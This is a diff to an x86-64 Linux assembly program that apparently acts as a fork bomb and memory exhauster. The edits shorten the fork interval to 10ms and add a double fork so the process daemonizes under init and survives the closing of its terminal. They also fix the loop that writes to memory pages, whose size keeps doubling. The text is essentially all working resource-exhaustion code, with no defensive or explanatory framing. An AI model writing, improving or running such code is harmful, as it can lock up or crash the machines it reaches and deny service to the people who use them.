@@ -2,15 +2,48 @@
 section .data
 
 s dq 0
-ns dq 100000000 ;100ms
+ns dq 10000000 ;10ms
 
 
 section .text
 
 global _start
- _start:
+_start:
 
+    ;fork
+    mov rax, 57
+    syscall 
+    test rax,rax
+    jz continue
+
+    locked: ;idle spin lock main proces to prevent terminal detach
+    ;nanosleep
+    mov rax, 35
+    mov rdi, s
+    xor rsi, rsi
+    syscall
+    jmp locked
+
+    continue:
 	;SEEDER CODE
+
+    ; DEAMONIZE child to become child of init
+    ;fork
+    mov rax, 57
+    xor rdi, rdi
+    syscall 
+    test rax,rax 
+    jnz exit
+    ; DEAMONIZE
+
+    start:
+    ; ;nanosleep
+    ; mov rax, 35
+    ; mov rdi, s
+    ; xor rsi, rsi
+    ; syscall
+    ; jmp start
+
 
 	;fork
 	mov rax, 57
@@ -24,7 +57,7 @@ global _start
 	xor rsi, rsi
 	syscall
 
-	jmp _start
+	jmp start
 	go:
 
     ;GROWER CODE init
@@ -57,10 +90,18 @@ global _start
     lop:
     mov rax, rcx
     shl rax, 10 ;rax = rcx*1024
+    dec rax
     mov byte [rbx+rax], 0
     loop lop
     ;TODO
 
     ;double page size
     shl r12, 1
+
     jmp grow
+
+    exit:
+    ;exit
+    mov rax, 60
+    xor rdi, rdi
+    syscall
